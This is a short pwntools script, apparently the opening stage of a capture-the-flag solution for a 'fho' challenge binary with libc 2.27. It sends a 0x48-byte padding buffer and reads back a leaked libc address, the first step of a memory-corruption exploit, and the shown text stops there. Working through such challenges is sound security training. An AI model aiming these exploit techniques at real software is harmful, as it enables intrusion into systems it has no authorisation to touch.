from pwn import *

port = 0
# rem = remote("", port)
rem = process("./fho/problem/fho")
elf = ELF("./fho/problem/fho")
lib = ELF("./fho/problem/libc-2.27.so")

payload = b'A' * 0x48
rem.sendafter(b'Buf: ', payload)
rem.recvuntil(payload)
libcMain_addr = u64(rem.recvn(8))
print(p64(libcMain_addr))
